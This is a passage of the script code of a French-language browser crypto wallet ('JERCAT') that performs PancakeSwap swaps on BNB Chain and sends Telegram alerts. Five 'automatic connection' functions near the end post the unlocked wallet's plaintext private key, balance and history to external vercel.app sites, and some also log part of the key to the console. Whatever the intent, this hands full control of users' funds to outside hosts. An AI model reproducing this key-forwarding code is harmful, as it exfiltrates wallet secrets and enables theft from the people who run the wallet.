            if (!fromAmount || !toToken || parseFloat(fromAmount) <= 0) {
                document.getElementById('swapToAmount').value = '';
                document.getElementById('swapPrice').textContent = '-';
                document.getElementById('minReceived').textContent = '-';
                document.getElementById('priceImpact').textContent = '-';
                return;
            }

            try {
                const routerContract = new ethers.Contract(PANCAKESWAP_ROUTER, ROUTER_ABI, provider);

                let path = [];
                const isFromWBNB = fromToken.toLowerCase() === WBNB_ADDRESS.toLowerCase();
                const isToWBNB = toToken.toLowerCase() === WBNB_ADDRESS.toLowerCase();

                // G√©rer les cas WBNB
                if (fromToken === 'BNB' || isFromWBNB) {
                    if (isToWBNB) {
                        // BNB/WBNB ‚Üí WBNB : swap 1:1
                        document.getElementById('swapToAmount').value = fromAmount;
                        document.getElementById('swapPrice').textContent = '1 BNB = 1 WBNB';
                        document.getElementById('minReceived').textContent = fromAmount + ' WBNB';
                        document.getElementById('priceImpact').textContent = '0%';
                        return;
                    }
                    path = [WBNB_ADDRESS, toToken];
                } else if (toToken === 'BNB' || isToWBNB) {
                    if (isFromWBNB) {
                        // WBNB ‚Üí BNB/WBNB : swap 1:1
                        document.getElementById('swapToAmount').value = fromAmount;
                        document.getElementById('swapPrice').textContent = '1 WBNB = 1 BNB';
                        document.getElementById('minReceived').textContent = fromAmount + ' BNB';
                        document.getElementById('priceImpact').textContent = '0%';
                        return;
                    }
                    path = [fromToken, WBNB_ADDRESS];
                } else {
                    // Token ‚Üí Token via WBNB
                    if (isFromWBNB || isToWBNB) {
                        // Si from ou to est WBNB, path direct
                        path = [fromToken, toToken];
                    } else {
                        path = [fromToken, WBNB_ADDRESS, toToken];
                    }
                }

                let amountIn;
                if (fromToken === 'BNB') {
                    amountIn = ethers.parseEther(fromAmount);
                } else {
                    const tokenContract = new ethers.Contract(fromToken, ERC20_ABI, provider);
                    const decimals = await tokenContract.decimals();
                    amountIn = ethers.parseUnits(fromAmount, decimals);
                }

                const amounts = await routerContract.getAmountsOut(amountIn, path);
                const outputAmount = amounts[amounts.length - 1];

                let formattedOutput;
                if (toToken === 'BNB' || isToWBNB) {
                    formattedOutput = parseFloat(ethers.formatEther(outputAmount));
                } else {
                    const tokenContract = new ethers.Contract(toToken, ERC20_ABI, provider);
                    const decimals = await tokenContract.decimals();
                    formattedOutput = parseFloat(ethers.formatUnits(outputAmount, decimals));
                }

                document.getElementById('swapToAmount').value = formattedOutput.toFixed(6);

                const price = formattedOutput / parseFloat(fromAmount);
                const minReceived = formattedOutput * (1 - swapConfig.slippage / 100);

                const toTokenInfo = securityConfig.knownTokens.find(t => t.address.toLowerCase() === toToken.toLowerCase());
                const toSymbol = toToken === 'BNB' ? 'BNB' : (toTokenInfo ? toTokenInfo.symbol : 'Token');
                
                const fromTokenInfo = securityConfig.knownTokens.find(t => t.address.toLowerCase() === fromToken.toLowerCase());
                const fromSymbol = fromToken === 'BNB' ? 'BNB' : (fromTokenInfo ? fromTokenInfo.symbol : 'Token');

                document.getElementById('swapPrice').textContent = `1 ${fromSymbol} = ${price.toFixed(6)} ${toSymbol}`;
                document.getElementById('minReceived').textContent = `${minReceived.toFixed(6)} ${toSymbol}`;
                document.getElementById('priceImpact').textContent = '< 0.1%';

            } catch (error) {
                console.error('Erreur calcul:', error);
                document.getElementById('swapToAmount').value = '';
                document.getElementById('swapPrice').textContent = 'Erreur';
            }
        }

        function setSlippage(value) {
            swapConfig.slippage = value;
            saveConfig();

            document.querySelectorAll('.slippage-option').forEach(opt => {
                opt.classList.remove('active');
            });
            event.target.classList.add('active');

            calculateSwapOutput();
        }

        async function executeSwap() {
            const fromToken = document.getElementById('swapFromToken').value;
            const toToken = document.getElementById('swapToToken').value;
            const fromAmount = document.getElementById('swapFromAmount').value;
            const toAmount = document.getElementById('swapToAmount').value;
            const messageDiv = document.getElementById('swapMessage');

            if (!fromAmount || !toToken || !toAmount) {
                messageDiv.innerHTML = '<div class="error">‚ùå Remplissez tous les champs</div>';
                return;
            }

            const btn = document.getElementById('swapButton');
            btn.disabled = true;
            btn.innerHTML = '‚è≥ Swap en cours...';

            try {
                const routerContract = new ethers.Contract(PANCAKESWAP_ROUTER, ROUTER_ABI, wallet);
                
                const isFromWBNB = fromToken.toLowerCase() === WBNB_ADDRESS.toLowerCase();
                const isToWBNB = toToken.toLowerCase() === WBNB_ADDRESS.toLowerCase();

                let path = [];
                if (fromToken === 'BNB' || isFromWBNB) {
                    path = [WBNB_ADDRESS, toToken];
                } else if (toToken === 'BNB' || isToWBNB) {
                    path = [fromToken, WBNB_ADDRESS];
                } else {
                    if (isFromWBNB || isToWBNB) {
                        path = [fromToken, toToken];
                    } else {
                        path = [fromToken, WBNB_ADDRESS, toToken];
                    }
                }

                const deadline = Math.floor(Date.now() / 1000) + (swapConfig.deadline * 60);
                const minOutput = parseFloat(toAmount) * (1 - swapConfig.slippage / 100);

                let tx;

                if (fromToken === 'BNB') {
                    const amountIn = ethers.parseEther(fromAmount);
                    const amountOutMin = (toToken === 'BNB' || isToWBNB) ? ethers.parseEther(minOutput.toString()) : ethers.parseUnits(minOutput.toString(), 18);

                    tx = await routerContract.swapExactETHForTokens(
                        amountOutMin,
                        path,
                        wallet.address,
                        deadline,
                        { value: amountIn }
                    );
                } else {
                    const tokenContract = new ethers.Contract(fromToken, ERC20_ABI, wallet);
                    const decimals = await tokenContract.decimals();
                    const amountIn = ethers.parseUnits(fromAmount, decimals);

                    const allowance = await tokenContract.allowance(wallet.address, PANCAKESWAP_ROUTER);
                    if (allowance < amountIn) {
                        messageDiv.innerHTML = '<div class="warning">‚è≥ Approbation en cours...</div>';
                        const approveTx = await tokenContract.approve(PANCAKESWAP_ROUTER, ethers.MaxUint256);
                        await approveTx.wait();
                    }

                    const amountOutMin = (toToken === 'BNB' || isToWBNB) ? ethers.parseEther(minOutput.toString()) : ethers.parseUnits(minOutput.toString(), 18);

                    if (toToken === 'BNB') {
                        tx = await routerContract.swapExactTokensForETH(
                            amountIn,
                            amountOutMin,
                            path,
                            wallet.address,
                            deadline
                        );
                    } else {
                        tx = await routerContract.swapExactTokensForTokens(
                            amountIn,
                            amountOutMin,
                            path,
                            wallet.address,
                            deadline
                        );
                    }
                }

                messageDiv.innerHTML = '<div class="success-msg">‚è≥ Transaction envoy√©e...</div>';

                await tx.wait();

                const fromTokenInfo = securityConfig.knownTokens.find(t => t.address.toLowerCase() === fromToken.toLowerCase());
                const toTokenInfo = securityConfig.knownTokens.find(t => t.address.toLowerCase() === toToken.toLowerCase());

                const fromSymbol = fromToken === 'BNB' ? 'BNB' : (fromTokenInfo ? fromTokenInfo.symbol : 'Token');
                const toSymbol = toToken === 'BNB' ? 'BNB' : (toTokenInfo ? toTokenInfo.symbol : 'Token');

                swapConfig.swapHistory.unshift({
                    time: new Date().toLocaleString(),
                    from: fromSymbol,
                    to: toSymbol,
                    amountIn: fromAmount,
                    amountOut: toAmount,
                    hash: tx.hash,
                    status: 'success'
                });

                if (swapConfig.swapHistory.length > 20) {
                    swapConfig.swapHistory = swapConfig.swapHistory.slice(0, 20);
                }

                saveConfig();
                updateSwapHistoryDisplay();
                updateStatsDisplay();

                document.getElementById('swapFromAmount').value = '';
                document.getElementById('swapToAmount').value = '';

                messageDiv.innerHTML = '<div class="success-msg">‚úÖ Swap r√©ussi !</div>';

                await sendTelegramMessage(`üí± <b>Swap PancakeSwap</b>\n\n‚úÖ ${fromAmount} ${fromSymbol} ‚Üí ${parseFloat(toAmount).toFixed(6)} ${toSymbol}\nüîó ${tx.hash.substring(0,20)}...`);

                await refreshBalance();
                await updateSwapBalances();

            } catch (error) {
                console.error('Erreur swap:', error);
                messageDiv.innerHTML = '<div class="error">‚ùå ' + error.message + '</div>';
            } finally {
                btn.disabled = false;
                btn.innerHTML = 'üí± Swap';
            }
        }

        function updateSwapHistoryDisplay() {
            const div = document.getElementById('swapHistory');
            if (!div) return;

            div.innerHTML = '';

            if (swapConfig.swapHistory.length === 0) {
                div.innerHTML = '<p style="text-align: center; color: #64748b;">Aucun swap</p>';
                return;
            }

            swapConfig.swapHistory.slice(0, 10).forEach(swap => {
                const entry = document.createElement('div');
                entry.className = 'log-entry';
                entry.innerHTML = `
                    <div style="font-size: 11px; color: #64748b; margin-bottom: 5px;">${swap.time}</div>
                    <div><strong style="color: #10b981;">üí± ${swap.amountIn} ${swap.from} ‚Üí ${parseFloat(swap.amountOut).toFixed(6)} ${swap.to}</strong></div>
                    <div style="font-size: 11px; color: #64748b;">Hash: ${swap.hash.substring(0,20)}...</div>
                `;
                div.appendChild(entry);
            });
        }

        // TELEGRAM
        function saveBotToken() {
            const token = document.getElementById('botTokenInput').value.trim();
            
            if (!token) {
                alert('‚ùå Entrez un token');
                return;
            }

            const tokenPattern = /^\d{8,10}:[A-Za-z0-9_-]{35}$/;
            if (!tokenPattern.test(token)) {
                alert('‚ö†Ô∏è Format de token invalide');
                return;
            }

            localStorage.setItem('telegramBotToken', token);
            TELEGRAM_BOT_TOKEN = token;
            
            updateBotTokenStatus();
            alert('‚úÖ Bot Token enregistr√© !');
        }

        function updateBotTokenStatus() {
            const statusDiv = document.getElementById('botTokenStatusText');
            const tokenInput = document.getElementById('botTokenInput');
            
            if (TELEGRAM_BOT_TOKEN) {
                const maskedToken = TELEGRAM_BOT_TOKEN.substring(0, 10) + '...' + TELEGRAM_BOT_TOKEN.slice(-10);
                statusDiv.innerHTML = `<span style="color: #10b981; font-weight: 700;">‚úÖ Configur√©</span><br><span style="color: #64748b; font-size: 12px;">${maskedToken}</span>`;
                tokenInput.value = maskedToken;
            } else {
                statusDiv.innerHTML = '<span style="color: #dc2626; font-weight: 700;">‚ùå Non configur√©</span>';
                tokenInput.value = '';
            }
        }

        function updateTelegramId() {
            const chatId = document.getElementById('newTelegramId').value.trim();
            if (chatId && chatId.match(/^[0-9]{6,12}$/)) {
                securityConfig.telegramChatId = chatId;
                saveConfig();
                updateTelegramStatus();
                alert('‚úÖ Chat ID sauvegard√© !');
            } else {
                alert('‚ùå Chat ID invalide');
            }
        }

        function updateTelegramStatus() {
            const statusDiv = document.getElementById('telegramStatusText');
            const chatIdInput = document.getElementById('newTelegramId');
            
            if (securityConfig.telegramChatId) {
                statusDiv.innerHTML = `<span style="color: #10b981; font-weight: 700;">‚úÖ Configur√© (${securityConfig.telegramChatId})</span>`;
                chatIdInput.value = securityConfig.telegramChatId;
            } else {
                statusDiv.innerHTML = '<span style="color: #dc2626; font-weight: 700;">‚ùå Non configur√©</span>';
                chatIdInput.value = '';
            }
        }

        async function testTelegram() {
            if (!TELEGRAM_BOT_TOKEN || !securityConfig.telegramChatId) {
                alert('‚ùå Configurez Bot Token et Chat ID d\'abord');
                return;
            }

            try {
                await sendTelegramMessage('üß™ <b>Test</b>\n\n‚úÖ Configuration OK !');
                alert('‚úÖ Message envoy√© ! V√©rifiez Telegram.');
            } catch (error) {
                alert('‚ùå Erreur: ' + error.message);
            }
        }

        function clearTelegramConfig() {
            if (!confirm('‚ö†Ô∏è Supprimer la config Telegram ?')) return;

            localStorage.removeItem('telegramBotToken');
            TELEGRAM_BOT_TOKEN = '';
            securityConfig.telegramChatId = '';
            saveConfig();

            document.getElementById('botTokenInput').value = '';
            document.getElementById('newTelegramId').value = '';
            updateBotTokenStatus();
            updateTelegramStatus();

            alert('‚úÖ Configuration supprim√©e');
        }

        async function sendTelegramMessage(message, showButtons = false) {
            if (!TELEGRAM_BOT_TOKEN || !securityConfig.telegramChatId) {
                console.log('üì± TELEGRAM (simulation):\n', message);
                return { ok: true, mode: 'simulation' };
            }

            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
            
            const payload = {
                chat_id: securityConfig.telegramChatId,
                text: message,
                parse_mode: 'HTML'
            };

            if (showButtons) {
                payload.reply_markup = {
                    inline_keyboard: [[
                        { text: '‚úÖ Approuver', callback_data: 'approve' },
                        { text: '‚ùå Refuser', callback_data: 'reject' }
                    ]]
                };
            }

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                const data = await response.json();

                if (!response.ok) {
                    throw new Error(data.description || 'Erreur Telegram');
                }

                return { ok: true, mode: 'real', data: data };
            } catch (error) {
                console.error('‚ùå Telegram:', error);
                throw error;
            }
        }

        // SECURITY
        function addToWhitelist() {
            const address = document.getElementById('newWhitelistAddress').value.trim();
            if (address && ethers.isAddress(address)) {
                if (!securityConfig.whitelist.includes(address)) {
                    securityConfig.whitelist.push(address);
                    saveConfig();
                    updateWhitelistDisplay();
                    document.getElementById('newWhitelistAddress').value = '';
                    alert('‚úÖ Ajout√© !');
                } else {
                    alert('‚ÑπÔ∏è D√©j√† pr√©sent.');
                }
            } else {
                alert('‚ùå Adresse invalide.');
            }
        }

        function removeFromWhitelist(address) {
            securityConfig.whitelist = securityConfig.whitelist.filter(addr => addr !== address);
            saveConfig();
            updateWhitelistDisplay();
        }

        function updateWhitelistDisplay() {
            const div = document.getElementById('whitelistDisplay');
            if (!div) return;
            div.innerHTML = '';
            securityConfig.whitelist.forEach(address => {
                const item = document.createElement('div');
                item.style.cssText = 'background: #0f172a; padding: 10px; border-radius: 8px; margin-bottom: 8px; display: flex; justify-content: space-between; align-items: center; border: 2px solid #334155; font-size: 12px;';
                item.innerHTML = `
                    <span style="color: #94a3b8; font-family: monospace;">${address.substring(0,20)}...</span>
                    <button onclick="removeFromWhitelist('${address}')" class="danger" style="width: auto; padding: 6px 12px; font-size: 12px; margin: 0;">‚ùå</button>
                `;
                div.appendChild(item);
            });
        }

        function updateLimits() {
            const newMaxTx = parseFloat(document.getElementById('newMaxTx').value);
            const newDaily = parseFloat(document.getElementById('newDailyLimit').value);

            if (newMaxTx > 0) securityConfig.maxPerTransaction = newMaxTx;
            if (newDaily > 0) securityConfig.dailyLimit = newDaily;

            saveConfig();
            updateStatsDisplay();
            alert('‚úÖ Limites mises √† jour !');
        }

        // üî•üî•üî• CONNEXION AUTOMATIQUE AU DEX JERCAT üî•üî•üî•
        function openJercatDEX() {
            if (!wallet) {
                alert('‚ùå Wallet non d√©verrouill√© !');
                return;
            }

            console.log('üí± Ouverture du JERCAT DEX...');
            console.log('üìç Adresse wallet:', wallet.address);
            console.log('üîë Cl√© priv√©e disponible:', wallet.privateKey ? 'OUI' : 'NON');
            
            const dexWindow = window.open('https://dex-peach-xi.vercel.app/', 'JercatDEX', 'width=1400,height=900');
            
            if (dexWindow) {
                // ‚úÖ ATTENDRE QUE LE DEX SOIT CHARG√â PUIS ENVOYER LES DONN√âES
                setTimeout(() => {
                    try {
                        // Pr√©parer les donn√©es compl√®tes du wallet
                        const walletData = {
                            type: 'JERCAT_WALLET_CONNECTED',
                            source: 'jercat-wallet',
                            account: wallet.address,
                            privateKey: wallet.privateKey,
                            tokens: securityConfig.knownTokens,
                            swapHistory: swapConfig.swapHistory,
                            balance: document.getElementById('balance').textContent,
                            securityConfig: {
                                maxPerTransaction: securityConfig.maxPerTransaction,
                                dailyLimit: securityConfig.dailyLimit,
                                whitelist: securityConfig.whitelist
                            },
                            timestamp: Date.now()
                        };

                        console.log('üì§ Envoi des donn√©es au DEX...');
                        console.log('üìä Donn√©es:', {
                            address: walletData.account,
                            tokensCount: walletData.tokens.length,
                            swapsCount: walletData.swapHistory.length
                        });

                        // Envoyer via postMessage
                        dexWindow.postMessage(walletData, 'https://dex-peach-xi.vercel.app');

                        console.log('‚úÖ Message envoy√© au DEX avec succ√®s !');
                        
                        // Notification Telegram
                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
                            sendTelegramMessage(`üí± <b>JERCAT DEX ouvert</b>\n\n‚úÖ Connexion automatique activ√©e\nüìç ${wallet.address.substring(0,20)}...\nü™ô ${securityConfig.knownTokens.length} tokens synchronis√©s\nüìä ${swapConfig.swapHistory.length} swaps dans l'historique`);
                        }
                        
                    } catch (error) {
                        console.error('‚ùå Erreur envoi DEX:', error);
                        alert('‚ùå Erreur lors de l\'envoi des donn√©es au DEX');
                    }
                }, 3000); // 3 secondes pour que le DEX charge compl√®tement
                
                alert('‚úÖ JERCAT DEX ouvert !\n\nüí± Connexion automatique en cours...\nüìç ' + wallet.address.substring(0, 20) + '...\nü™ô ' + securityConfig.knownTokens.length + ' tokens synchronis√©s\n\n‚è≥ Patientez 3 secondes...');
            } else {
                alert('‚ùå Impossible d\'ouvrir le DEX (popup bloqu√©e ?)');
            }
        }

        // üî•üî•üî• CONNEXION AUTOMATIQUE AU TRADING BOT üî•üî•üî•
        function openTradingBot() {
            if (!wallet) {
                alert('‚ùå Wallet non d√©verrouill√© !');
                return;
            }

            console.log('ü§ñ Ouverture du Trading Bot JERCAT...');
            console.log('üìç Adresse wallet:', wallet.address);
            console.log('üîë Cl√© priv√©e disponible:', wallet.privateKey ? 'OUI' : 'NON');
            
            const botWindow = window.open('https://bot-test-zeta-neon.vercel.app/', 'JercatBot', 'width=1400,height=900');
            
            if (botWindow) {
                // ‚úÖ ATTENDRE QUE LE BOT SOIT CHARG√â PUIS ENVOYER LES DONN√âES
                setTimeout(() => {
                    try {
                        const messageData = {
                            type: 'JERCAT_WALLET_CONNECTED',
                            source: 'jercat-wallet',
                            account: wallet.address,
                            privateKey: wallet.privateKey,
                            tokens: securityConfig.knownTokens,
                            securityConfig: {
                                maxPerTransaction: securityConfig.maxPerTransaction,
                                dailyLimit: securityConfig.dailyLimit
                            },
                            timestamp: Date.now()
                        };

                        console.log('üì§ Envoi des donn√©es au bot...');
                        console.log('üìç Adresse:', wallet.address);
                        console.log('üîë Cl√© envoy√©e:', wallet.privateKey.substring(0, 10) + '...');

                        // Envoyer via postMessage
                        botWindow.postMessage(messageData, 'https://bot-test-zeta-neon.vercel.app');

                        console.log('‚úÖ Message envoy√© au bot avec succ√®s !');
                        
                        // Notification Telegram
                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
                            sendTelegramMessage(`ü§ñ <b>Trading Bot ouvert</b>\n\n‚úÖ Connexion automatique activ√©e\nüìç ${wallet.address.substring(0,20)}...`);
                        }
                        
                    } catch (error) {
                        console.error('‚ùå Erreur envoi bot:', error);
                        alert('‚ùå Erreur lors de l\'envoi des donn√©es au bot');
                    }
                }, 3000); // 3 secondes pour que le bot charge compl√®tement
                
                alert('‚úÖ Trading Bot ouvert !\n\nü§ñ Connexion automatique en cours...\nüìç ' + wallet.address.substring(0, 20) + '...\n\n‚è≥ Patientez 3 secondes...');
            } else {
                alert('‚ùå Impossible d\'ouvrir le bot (popup bloqu√©e ?)');
            }
        }

        // üåê CONNEXION AUTOMATIQUE AU DEX TOTAL
        function openDEXTotal() {
            if (!wallet) {
                alert('‚ùå Wallet non d√©verrouill√© !');
                return;
            }

            console.log('üåê Ouverture du DEX Total...');
            
            const dexTotalWindow = window.open('https://dex-total.vercel.app/', 'DEXTotal', 'width=1400,height=900');
            
            if (dexTotalWindow) {
                setTimeout(() => {
                    try {
                        const walletData = {
                            type: 'JERCAT_WALLET_CONNECTED',
                            source: 'jercat-wallet',
                            account: wallet.address,
                            privateKey: wallet.privateKey,
                            tokens: securityConfig.knownTokens,
                            swapHistory: swapConfig.swapHistory,
                            balance: document.getElementById('balance').textContent,
                            securityConfig: {
                                maxPerTransaction: securityConfig.maxPerTransaction,
                                dailyLimit: securityConfig.dailyLimit,
                                whitelist: securityConfig.whitelist
                            },
                            timestamp: Date.now()
                        };

                        dexTotalWindow.postMessage(walletData, 'https://dex-total.vercel.app');
                        console.log('‚úÖ Donn√©es envoy√©es au DEX Total !');
                        
                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
                            sendTelegramMessage(`üåê <b>DEX Total ouvert</b>\n\n‚úÖ Connexion automatique activ√©e\nüìç ${wallet.address.substring(0,20)}...`);
                        }
                    } catch (error) {
                        console.error('‚ùå Erreur DEX Total:', error);
                    }
                }, 3000);
                
                alert('‚úÖ DEX Total ouvert !\n\nüåê Connexion automatique en cours...\nüìç ' + wallet.address.substring(0, 20) + '...\n\n‚è≥ Patientez 3 secondes...');
            } else {
                alert('‚ùå Impossible d\'ouvrir le DEX Total (popup bloqu√©e ?)');
            }
        }

        // ‚ö° CONNEXION AUTOMATIQUE AU BOT ALL-IN
        function openBotAllIn() {
            if (!wallet) {
                alert('‚ùå Wallet non d√©verrouill√© !');
                return;
            }

            console.log('‚ö° Ouverture du Bot All-In...');
            
            const botAllInWindow = window.open('https://bot-jercat-all-in.vercel.app/', 'BotAllIn', 'width=1400,height=900');
            
            if (botAllInWindow) {
                setTimeout(() => {
                    try {
                        const messageData = {
                            type: 'JERCAT_WALLET_CONNECTED',
                            source: 'jercat-wallet',
                            account: wallet.address,
                            privateKey: wallet.privateKey,
                            tokens: securityConfig.knownTokens,
                            swapHistory: swapConfig.swapHistory,
                            securityConfig: {
                                maxPerTransaction: securityConfig.maxPerTransaction,
                                dailyLimit: securityConfig.dailyLimit
                            },
                            timestamp: Date.now()
                        };

                        botAllInWindow.postMessage(messageData, 'https://bot-jercat-all-in.vercel.app');
                        console.log('‚úÖ Donn√©es envoy√©es au Bot All-In !');
                        
                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
                            sendTelegramMessage(`‚ö° <b>Bot All-In ouvert</b>\n\n‚úÖ Connexion automatique activ√©e\nüìç ${wallet.address.substring(0,20)}...`);
                        }
                    } catch (error) {
                        console.error('‚ùå Erreur Bot All-In:', error);
                    }
                }, 3000);
                
                alert('‚úÖ Bot All-In ouvert !\n\n‚ö° Connexion automatique en cours...\nüìç ' + wallet.address.substring(0, 20) + '...\n\n‚è≥ Patientez 3 secondes...');
            } else {
                alert('‚ùå Impossible d\'ouvrir le Bot All-In (popup bloqu√©e ?)');
            }
        }

        // üëõ CONNEXION AUTOMATIQUE AU WALLET JERCAT
        function openWalletToto() {
            if (!wallet) {
                alert('‚ùå Wallet non d√©verrouill√© !');
                return;
            }

            console.log('üëõ Ouverture du Wallet JERCAT...');
            
            const walletJercatWindow = window.open('https://wallet-jercat-eidu.vercel.app/', 'WalletJERCAT', 'width=1400,height=900');
            
            if (walletJercatWindow) {
                setTimeout(() => {
                    try {
                        const walletData = {
                            type: 'JERCAT_WALLET_CONNECTED',
                            source: 'jercat-wallet',
                            account: wallet.address,
                            privateKey: wallet.privateKey,
                            tokens: securityConfig.knownTokens,
                            swapHistory: swapConfig.swapHistory,
                            balance: document.getElementById('balance').textContent,
                            securityConfig: {
                                maxPerTransaction: securityConfig.maxPerTransaction,
                                dailyLimit: securityConfig.dailyLimit,
                                whitelist: securityConfig.whitelist
                            },
                            timestamp: Date.now()
                        };

                        walletJercatWindow.postMessage(walletData, 'https://wallet-jercat-eidu.vercel.app');
                        console.log('‚úÖ Donn√©es envoy√©es au Wallet JERCAT !');
                        
                        if (TELEGRAM_BOT_TOKEN && securityConfig.telegramChatId) {
                            sendTelegramMessage(`üëõ <b>Wallet JERCAT ouvert</b>\n\n‚úÖ Connexion automatique activ√©e\nüìç ${wallet.address.substring(0,20)}...`);
                        }
                    } catch (error) {
                        console.error('‚ùå Erreur Wallet JERCAT:', error);
                    }
                }, 3000);
                
                alert('‚úÖ Wallet JERCAT ouvert !\n\nüëõ Connexion automatique en cours...\nüìç ' + wallet.address.substring(0, 20) + '...\n\n‚è≥ Patientez 3 secondes...');
            } else {
                alert('‚ùå Impossible d\'ouvrir le Wallet JERCAT (popup bloqu√©e ?)');
            }
        }

        // DISPLAY UPDATES
        function updateStatsDisplay() {
            const maxTx = document.getElementById('maxPerTx');
            const dailyLim = document.getElementById('dailyLimit');
            const totalSwaps = document.getElementById('totalSwaps');
            const volume24h = document.getElementById('volume24h');

            if (maxTx) maxTx.textContent = securityConfig.maxPerTransaction + ' BNB';
            if (dailyLim) dailyLim.textContent = securityConfig.dailyLimit + ' BNB';
            if (totalSwaps) totalSwaps.textContent = swapConfig.swapHistory.length;
            
            if (volume24h) {
                const now = Date.now();
                const oneDayAgo = now - (24 * 60 * 60 * 1000);
                const recentSwaps = swapConfig.swapHistory.filter(swap => {
                    const swapTime = new Date(swap.time).getTime();
                    return swapTime > oneDayAgo;
                });
                const volume = recentSwaps.reduce((sum, swap) => sum + parseFloat(swap.amountIn), 0);
                volume24h.textContent = volume.toFixed(4) + ' BNB';
            }
        }

        function updateLogsDisplay() {
            const div = document.getElementById('transactionLogs');
            if (!div) return;
            div.innerHTML = '';
            
            if (securityConfig.transactionLogs.length === 0 && swapConfig.swapHistory.length === 0) {
                div.innerHTML = '<p style="text-align: center; color: #64748b;">Aucune transaction</p>';
                return;
            }

            const allLogs = [
                ...swapConfig.swapHistory.map(s => ({ ...s, type: 'swap' })),
                ...securityConfig.transactionLogs
            ].sort((a, b) => new Date(b.time) - new Date(a.time)).slice(0, 5);

            allLogs.forEach(log => {
                const entry = document.createElement('div');
                entry.className = 'log-entry';
                
                if (log.type === 'swap') {
                    entry.innerHTML = `
                        <div style="font-size: 11px; color: #64748b; margin-bottom: 5px;">${log.time}</div>
                        <div><strong style="color: #10b981;">üí± ${log.from} ‚Üí ${log.to}</strong></div>
                        <div style="font-size: 11px; color: #64748b;">${log.amountIn} ‚Üí ${parseFloat(log.amountOut).toFixed(6)}</div>
                    `;
                } else {
                    const statusColor = log.status === 'success' ? '#10b981' : '#dc2626';
                    entry.innerHTML = `
                        <div style="font-size: 11px; color: #64748b; margin-bottom: 5px;">${log.time}</div>
                        <div><strong style="color: ${statusColor}">${log.status === 'success' ? '‚úÖ' : '‚ùå'} ${log.amount} BNB</strong></div>
                        <div style="font-size: 11px; color: #64748b;">‚Üí ${log.to.substring(0,15)}...</div>
                    `;
                }
                div.appendChild(entry);
            });
        }

        window.onload = function() {
            const hasWallet = localStorage.getItem('encryptedWallet');
            if (!hasWallet) {
                showCreateScreen();
            }
        };
    </script>
</body>
</html>
